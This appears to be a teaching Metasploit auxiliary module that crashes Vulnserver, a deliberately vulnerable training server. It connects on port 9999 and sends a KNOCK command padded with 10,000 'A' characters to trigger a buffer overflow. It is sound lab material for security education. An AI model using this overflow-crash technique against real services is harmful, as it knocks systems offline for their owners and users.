class MetasploitModule < Msf::Auxiliary	# This is a remote exploit module inheriting from the remote exploit class

  Rank = NormalRanking	# Potential impact to the target ranking

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module

  def initialize(info = {})	# i.e. constructor, setting the initial values

    super(update_info(info, #calls parent class update_info function
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', # Name of the target
      'Description'    => %q{
         Vulnserver is intentially written vulnerable. This expoits uses a simple buffer overflow.
      },
      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], # Author name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      #'DefaultOptions' =>
        #{ 
          #'RPORT' => 9999
      #  },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public

      register_options([
	    Opt::RPORT(9999)
	])
  end

  def run	# Actual exploit, since this is a Auxiliary, it is a run function, type run to execute

        print_status("Connecting to target with IP #{datastore['RHOST']} and Port #{datastore['RPORT']}")

        connect #connect to target using values stored in datastore
        outbound = "KNOCK /.:/" + "A"*10000 #create outbound message, in this case A can be anything as we just want to crash the server 
        print_status("Sending Message in 6 seconds")
        
	for x in 0..5 do
            print_status("#{6 - x}")
            sleep(1) #sleep for 1 second 6 times so that we will wait 6 seconds and count down
        end

        sock.put(outbound)
        print_status("Message Sent")

    ensure #ensure that exploit disconnects
        disconnect
        print_status("Exiting Run Function")
  end
end

